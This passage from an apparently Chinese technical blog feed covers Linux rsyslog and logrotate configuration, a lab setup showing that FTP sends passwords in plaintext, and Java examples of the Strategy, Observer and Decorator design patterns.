imudp</span><span class="hljs-meta prompt_">$</span><span class="language-bash">UDPServerRun 514 // 这两个注释去掉，使用udp</span>local5.* /var/log/server12.log<span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart rsyslog</span>尝试ssh登录服务器1,并观察本地日志<span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">tail</span> -f /var/log/server12.<span class="hljs-built_in">log</span></span>language-shell复制代码</code></pre><hr><h3 id="7-logrotate-日志轮转"><a href="#7-logrotate-日志轮转" class="headerlink" title="7.logrotate 日志轮转"></a>7.logrotate 日志轮转</h3><ol><li>简介</li></ol><blockquote><ol><li>日志轮转也叫日志轮替，日志切割:</li><li>如果没有日志轮转，日文件会越来越大;</li><li>将丢弃系统中最旧的日志文件，以节省空间;</li><li>logrotate 本身不是系统守护进程，它是通过计划任务 crond 每天执行;</li></ol></blockquote><pre><code class="hljs shell">cat /etc/cron.daily/logrotatelanguage-shell复制代码<span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span>/usr/sbin/logrotate -s /var/lib/logrotate/logrotate.status /etc/logrotate.confEXITVALUE=$?if [ $EXITVALUE != 0 ]; then    /usr/bin/logger -t logrotate &quot;ALERT exited abnormally with [$EXITVALUE]&quot;fiexit 0language-shell复制代码</code></pre><ol><li>日志文件命名规则</li></ol><p>日志轮替最主要的作用就是把旧的日志文件移动并改名， 同时建立新的空日志文件，当旧日志文件超出保存的范围 之后，就会进行删除。那么旧的日志文件改名之后，如何 命名呢?主要依靠&#x2F;etc&#x2F;logrotate.conf 配置文件中<br>“dateext”参数:</p><ul><li>如果配置文件中拥有“dateext”参数，那么日志会用日期来作为日志文件的后缀，例如“secure-20180605”。这样的话日志文件名不会重叠，所以也就不需要日志文件的改名，只需要保存指定的日志个数，删除多余的日志文件即可。</li><li>如果配置文件中没有“dateext”参数，那么日志文件就需要 进行改名了。当第一次进行日志轮替时，当前的“secure”日志会自动改名为“secure.1”，然后新建“secure”日志，用 来保存新的日志。当第二次进行日志轮替时，“secure.1”会 自动改名为“secure.2”，当前的“secure”日志会自动改名 为“secure.1”，然后也会新建“secure”日志，用来保存新 的日志，以此类推。</li></ul><ol><li>logrotate 配置文件</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/logrotate.conf</span>weekly  // 轮转的周期，一周轮转rotate 4 // 保留4份create // 轮转后创建新文件dateext // 使用日期作为后缀<span class="hljs-meta prompt_">#</span><span class="language-bash">compress // 是否压缩，</span>include /etc/logrotate.d // 包含该目录下的文件也轮询/var/log/wtmp &#123; // 对该日志文件设置轮转的方法    monthly// 一月轮转一次    create 0664 root utmp// 轮转后创建新文件，并设置权限    minsize 1M// 最小达到1M才轮转    rotate 1// 保留一份&#125;/var/log/btmp &#123;    missingok// 丢失不提示    monthly// 每月轮转一次    create 0600 root utmp// 轮转后创建新文件，并设置权限    rotate 1// 保留一份&#125;language-shell复制代码</code></pre><p>其他配置信息</p><ul><li>size 大小:日志只有大于指定大小才进行日志轮替，而不是按 照时间轮替。如 size 100k</li><li>prerotate&#x2F;endscript:在日志轮替之前执行脚本命令。 endscript 标示 prerotate 脚本结束。</li><li>postrotate&#x2F;endscript:在日志轮替之后执行脚本命令。 endscript 标示 postrotate 脚本结</li></ul><p>logrotate 命令的格式</p><ul><li>[root@localhost ~]# logrotate [选项] 配置文件名</li><li>选项: 如果此命令没有选项，则会按照配置文件中的条件进行日志轮替<br>-v: 显示日志轮替过程。加了-v 选项，会显示日志的轮替的过程<br>-f: 强制进行日志轮替。不管日志轮替的条件是否已经符合，强制配置文件中所有的日志进行轮替</li></ul><ol><li>轮转案例:对&#x2F;var&#x2F;log&#x2F;err.log 轮转</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/logrotate.d/err_log <span class="hljs-comment"># 编辑轮转规则</span></span>/var/log/err.log &#123;        # 每天轮转        daily        # 使用日期命名        dateext        # 创建新文件        create        # 保留5分        rotate 5        # 丢失不提示        missingok&#125;<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">logrotate -f /etc/logrotate.d/err_log <span class="hljs-comment"># 手动强制启动轮转</span></span><span class="hljs-meta prompt_"># </span><span class="language-bash">ll /var/log/</span>-rw-------. 1 root   root    11449 6月   8 03:31 boot.log-20210608language-shell复制代码</code></pre><ol><li>作业</li></ol><pre><code class="hljs shell">logrotate日志轮转1、将我们自己生产的/var/log/err.log 日志志加入日志轮替的策略vim /etc/logrotate.d/err<span class="hljs-meta prompt_"># </span><span class="language-bash">创建err文件，把/var/log/err.log加入轮替</span>/var/log/err.log &#123;weekly#每周轮替一次rotate 6#保留6个轮替日志sharedscripts#以下命令只执行一次prerotate/usr/bin/chattr -a /var/log/err.log<span class="hljs-meta prompt_">#</span><span class="language-bash">在日志轮替前取消a属性，以便让日志可以轮替</span>endscriptsharedscriptspostretate/usr/bin/chattr +a /var/log/err.log<span class="hljs-meta prompt_">#</span><span class="language-bash">日志轮替完毕再加上a属性</span>endscriptsharedscriptspostrotate/bin/kill -HUP $(/bin/cat /var/run/syslogd.pid 2&gt;/dev/null) &amp;&gt;/dev/null<span class="hljs-meta prompt_">#</span><span class="language-bash">重启rsyslog服务，确保日志轮替正常</span>endscript&#125;2、要把 Nginx 服务的日志加入日志轮替，则也需要重启 Nginx 服务首先，安装nginx// yum install http://nginx.org/packages/rhel/7/x86_64/RPMS/nginx-1.10.3-1.el7.ngx.x86_64.rpm其次，启动服务后，客户端访问及可产生日志<span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl start nginx</span><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> nginx#</span><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span> /var/log/nginx/</span>access.log  error.log最后，对访问和错误日志加入轮替vim /etc/logrotate.d/nginx/var/log/nginx/access.log /var/log/nginx/error.log &#123;dailyrotate 15sharedscriptspostrotate/bin/kill -HUP $(/bin/cat /var/run/syslogd.pid) &amp;&gt;/dev/null<span class="hljs-meta prompt_">#</span><span class="language-bash">重启 rsyslog 服务</span>/bin/kill -HUP $(/bin/cat /var/run/nginx.pid) &amp;&gt;/dev/null<span class="hljs-meta prompt_">#</span><span class="language-bash">重启 Nginx 服务</span>endscript&#125;language-shell复制代码</code></pre><h3 id="8-sshd"><a href="#8-sshd" class="headerlink" title="8.sshd"></a>8.sshd</h3><ol><li>sshd 简介</li></ol><ul><li>传统的网络服务程序，如:ftp 和 telnet 在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。</li><li>演示 tcpdump 截获 ftp 用户名和密码。</li></ul><pre><code class="hljs shell">1.前置条件[root@localhost ~]# yum install vsftpd -y// 安装 ftp 服务期端[root@localhost ~]# systemctl start vsftpd// 启动 ftp 服务[root@localhost ~]# yum install tcpdump// 安装 tcpdump[root@localhost ~]# tcpdump -i ens33 -nnX port 21// 使用 tcpdump 监听 21端口[root@localhost ~]# useradd ftpuser// 创建ftp测试用户[root@localhost ~]# echo &quot;hadoop&quot; | passwd --stdin ftpuserlanguage-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/2021/04/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/04/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Head-First-设计模式"><a href="#Head-First-设计模式" class="headerlink" title="Head First 设计模式"></a>Head First 设计模式</h1><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><ol><li>使用模式最好的方式是“把模式装进脑子里，然后在你的设计和已有的应用中，寻找何处可以使用它们。”以往是代码复用，现在是经验复用。</li></ol><hr><h2 id="第一招-策略模式"><a href="#第一招-策略模式" class="headerlink" title="第一招 策略模式"></a>第一招 策略模式</h2><h3 id="1-1-设计原则"><a href="#1-1-设计原则" class="headerlink" title="1.1 设计原则"></a>1.1 设计原则</h3><ol><li>找出应用中可能需要变化之处，把它们独立出来，不要和哪些不需要变化的代码混在一起。</li><li>针对接口编程，而不是针对实现编程。</li><li>多用组合，少用继承。</li></ol><hr><h3 id="1-2-上🦆UML"><a href="#1-2-上🦆UML" class="headerlink" title="1.2 上🦆UML"></a>1.2 上🦆UML</h3><h2 id="DuckUML-png"><a href="#DuckUML-png" class="headerlink" title="DuckUML.png"></a><img src="https://hjxstart.github.io/images/2021/04/18/7291c4c4-aec5-4d0c-8883-bdd2e4a4f5fe.png" alt="DuckUML.png">DuckUML.png</h2><h3 id="1-3-上🦆代码"><a href="#1-3-上🦆代码" class="headerlink" title="1.3 上🦆代码"></a>1.3 上🦆代码</h3><p><strong>封装飞行行为</strong></p><pre><code class="hljs Java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">FlyBehavior</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlyWithWings</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;鸭子的飞行了&quot;</span>);    &#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlyNoWay</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;鸭子不会飞&quot;</span>);    &#125;&#125;language-Java</code></pre><p><strong>封装呱呱叫行为</strong></p><pre><code class="hljs Java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">QuackBehavior</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Qucak</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">QuackBehavior</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;鸭子呱呱叫&quot;</span>);    &#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Squeak</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">QuackBehavior</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;鸭子吱吱叫&quot;</span>);    &#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MuteQuack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">QuackBehavior</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;不会叫&quot;</span>)；    &#125;&#125;language-Java</code></pre><p><strong>客户使用封装好的飞行和呱呱叫算法族</strong></p><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span>&#123;    <span class="hljs-keyword">private</span> FlyBehavior flyBehavior;    <span class="hljs-keyword">private</span> QuackBehavior quackBehavior;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;鸭子会游泳&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performQuack</span><span class="hljs-params">()</span> &#123;        quackBehavior.quack();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performFly</span><span class="hljs-params">()</span> &#123;        flyBehavior.fly();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlyBehavior</span><span class="hljs-params">(FlyBehavior flyBehavior)</span> &#123;        <span class="hljs-built_in">this</span>.flyBehavior = flyBehavior;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuackBehavior</span><span class="hljs-params">(QuackBehavior quackBehavior)</span> &#123;        <span class="hljs-built_in">this</span>.quackBehavior = quackBehavior;    &#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MallardDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;gree duck&quot;</span>);    &#125;&#125;language-Java</code></pre><p><strong>Test类</strong></p><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StrategymodeTest</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> &#123;        <span class="hljs-type">Duck</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MallardDuck</span>();        d1.setFlyBehavior(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlyWithWings</span>());        d1.performFly();        d1.setQuackBehavior(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Qucak</span>());        d1.performQuack();    &#125;&#125;language-Java</code></pre><p>输入结果</p><pre><code class="hljs bash">$ java StrategymodeTest鸭子的飞行了鸭子呱呱叫</code></pre><hr><h2 id="第二招-观察者模式"><a href="#第二招-观察者模式" class="headerlink" title="第二招 观察者模式"></a>第二招 观察者模式</h2><h3 id="2-1-设计原则"><a href="#2-1-设计原则" class="headerlink" title="2.1 设计原则"></a>2.1 设计原则</h3><ol><li>找出应用中可能需要变化之处，把它们独立出来，不要和哪些不需要变化的代码混在一起。</li><li>针对接口编程，而不是针对实现编程。</li><li>多用组合，少用继承。</li><li>为交互对象之间的松耦合设计而努力</li></ol><hr><h3 id="2-2-上UML图"><a href="#2-2-上UML图" class="headerlink" title="2.2 上UML图"></a>2.2 上UML图</h3><p><img src="https://hjxstart.github.io/images/2021/04/20/4a2c8f37-32be-424c-ad5f-1c7932066617.png" alt="观察者模式.png"></p><p>观察者模式.png</p><hr><h3 id="2-3-上代码"><a href="#2-3-上代码" class="headerlink" title="2.3 上代码"></a>2.3 上代码</h3><ol><li>主题和观察者的接口</li></ol><pre><code class="hljs Java"><span class="hljs-comment">// 主题接口</span><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Subject</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(Observer o)</span>;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(Observer o)</span>;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObserver</span><span class="hljs-params">()</span>;&#125;<span class="hljs-comment">// 观察者接口</span><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Observer</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Subject o, Object arg)</span>;&#125;language-Java</code></pre><ol><li>具体主题1</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteSubject1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Subject</span>&#123;    <span class="hljs-keyword">private</span> ArrayList&lt;Observer&gt; observers;    <span class="hljs-keyword">private</span> ArrayList&lt;String&gt; arg;    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">changed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteSubject1</span><span class="hljs-params">()</span> &#123;        observers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Observer&gt;();        arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(Observer o)</span> &#123;        observers.add(o);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(Observer o)</span> &#123;        observers.remove(o);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObserver</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">if</span> (changed) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; observers.size(); i++) &#123;                <span class="hljs-type">Observer</span> <span class="hljs-variable">observer</span> <span class="hljs-operator">=</span> (Observer)observers.get(i);                observer.update(<span class="hljs-built_in">this</span>, arg);            &#125;            changed = <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setChanged</span><span class="hljs-params">()</span> &#123;        changed = <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMeasurements</span><span class="hljs-params">(String data)</span> &#123;        arg.add(data);        notifyObserver();    &#125;&#125;language-Java</code></pre><ol><li>具体主题2</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteSubject2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Subject</span>&#123;    <span class="hljs-keyword">private</span> ArrayList&lt;Observer&gt; observers;    <span class="hljs-keyword">private</span> ArrayList&lt;String&gt; arg;    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">changed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteSubject2</span><span class="hljs-params">()</span> &#123;        observers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Observer&gt;();        arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(Observer o)</span> &#123;        observers.add(o);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(Observer o)</span> &#123;        observers.remove(o);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObserver</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">if</span> (changed) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; observers.size(); i++) &#123;                <span class="hljs-type">Observer</span> <span class="hljs-variable">observer</span> <span class="hljs-operator">=</span> (Observer)observers.get(i);                observer.update(<span class="hljs-built_in">this</span>, arg);            &#125;        &#125;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setChanged</span><span class="hljs-params">()</span> &#123;        changed = <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMeasurements</span><span class="hljs-params">(String data)</span> &#123;        arg.add(data);        notifyObserver();    &#125;&#125;language-Java</code></pre><ol><li>关注具体主题1的具体观察者1</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteObserver1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Observer</span> &#123;    <span class="hljs-keyword">private</span> Subject subject;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteObserver1</span><span class="hljs-params">(Subject subject)</span> &#123;        <span class="hljs-built_in">this</span>.subject = subject;        subject.registerObserver(<span class="hljs-built_in">this</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Subject o, Object arg)</span> &#123;        System.out.println(<span class="hljs-string">&quot;我是观察者1，我的主题1更新了&quot;</span>);    &#125; &#125;language-Java</code></pre><ol><li>关注具体主题1，2的具体观察者2</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteObserver2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Observer</span> &#123;    <span class="hljs-keyword">private</span> Subject subject1;    <span class="hljs-keyword">private</span> Subject subject2;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteObserver2</span><span class="hljs-params">(Subject subject1, Subject subject2)</span> &#123;        <span class="hljs-built_in">this</span>.subject1 = (Subject)subject1;        <span class="hljs-built_in">this</span>.subject2 = (Subject)subject2;        subject1.registerObserver(<span class="hljs-built_in">this</span>);        subject2.registerObserver(<span class="hljs-built_in">this</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Subject o, Object arg)</span> &#123;        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> ConcreteSubject1) &#123;            System.out.println(<span class="hljs-string">&quot;我是观察者2，我的主题1更新了&quot;</span>);        &#125;        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> ConcreteSubject2) &#123;            System.out.println(<span class="hljs-string">&quot;我是观察者2，我的主题2更新了&quot;</span>);        &#125;    &#125;&#125;language-Java</code></pre><ol><li>关注具体主题2的具体观察者3</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteObserver3</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Observer</span> &#123;    <span class="hljs-keyword">private</span> Subject subject;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteObserver3</span><span class="hljs-params">(Subject subject)</span> &#123;        <span class="hljs-built_in">this</span>.subject = subject;        subject.registerObserver(<span class="hljs-built_in">this</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Subject o, Object arg)</span> &#123;        System.out.println(<span class="hljs-string">&quot;我是观察者3, 我的主题2更新了&quot;</span>);    &#125;&#125;language-Java</code></pre><ol><li>测试代码</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObserverTest</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">ConcreteSubject1</span> <span class="hljs-variable">subject1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteSubject1</span>();        <span class="hljs-type">ConcreteSubject2</span> <span class="hljs-variable">subject2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteSubject2</span>();        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteObserver1</span>(subject1);        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteObserver2</span>(subject1, subject2);        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteObserver3</span>(subject2);        subject1.setChanged();        subject1.setMeasurements(<span class="hljs-string">&quot;test&quot;</span>);        subject2.setMeasurements(<span class="hljs-string">&quot;test2&quot;</span>);    &#125;&#125;language-Java</code></pre><ol><li>测试结果</li></ol><pre><code class="hljs bash">$ java ObserverTest我是观察者1，我的主题1更新了我是观察者2，我的主题1更新了我是观察者2，我的主题2更新了我是观察者3, 我的主题2更新了</code></pre><ol><li>java.util包实现了Observable类，也可以满足一些观察者的情况。首先，因为没有Observer接口，所以无法建立自己的实现，和Java内置的Observer API搭配使用。</li></ol><hr><h2 id="第3招-装饰者模式"><a href="#第3招-装饰者模式" class="headerlink" title="第3招 装饰者模式"></a>第3招 装饰者模式</h2><p><strong>装饰纸模式:动态地将责任附加到对象上。想要扩展功能，装饰者提供有别于继承的另一种选择。</strong></p><hr><h3 id="3-1设计原则"><a href="#3-1设计原则" class="headerlink" title="3.1设计原则"></a>3.1设计原则</h3><ol><li>封装变化</li><li>多用组合，少用继承</li><li>针对接口编程，不针对实现编程</li><li>为交互对象之间的松耦合设计而努力</li><li><strong>对扩展开发，对修改关闭</strong></li></ol><hr><h3 id="3-2上UML图"><a href="#3-2上UML图" class="headerlink" title="3.2上UML图"></a>3.2上UML图</h3><p><strong>先决定那种咖啡，在决定使用什么配料。</strong></p><p><img src="https://hjxstart.github.io/images/2021/04/23/a2c4ef40-4bd5-46ae-89b4-0a1f9b421c13.png" alt="装饰者模式.png"></p><p>装饰者模式.png</p><hr><h3 id="3-3上代码"><a href="#3-3上代码" class="headerlink" title="3.3上代码"></a>3.3上代码</h3><ol><li>定义饮料类，必须设置一个抽象方法。</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Beverage</span> &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">description</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unknown Beverage&quot;</span>;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> description;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">double</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span>;&#125;language-Java</code></pre><hr><ol><li>深烘咖啡，实现夫类的抽象方法。</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DarkRoast</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Beverage</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DarkRoast</span><span class="hljs-params">()</span> &#123;        description = <span class="hljs-string">&quot;DarkRoast Coffee&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">1.19</span>;    &#125;&#125;language-Java</code></pre><hr><ol><li>定义装饰者。调味装饰者</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CondimentDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Beverage</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span>;&#125;language-Java</code></pre><hr><ol><li>实现第一个一个装饰者。牛奶配料</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Milk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CondimentDecorator</span>&#123;    Beverage beverage;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Milk</span><span class="hljs-params">(Beverage beverage)</span> &#123;        <span class="hljs-built_in">this</span>.beverage = beverage;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> beverage.getDescription() + <span class="hljs-string">&quot;, Milk&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">.10</span> + beverage.cost();    &#125;&#125;language-Java</code></pre><hr><ol><li>实现第二个装饰者。摩卡配料</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mocha</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CondimentDecorator</span> &#123;    Beverage beverage;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Mocha</span><span class="hljs-params">(Beverage beverage)</span> &#123;        <span class="hljs-built_in">this</span>.beverage = beverage;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> beverage.getDescription() + <span class="hljs-string">&quot;, 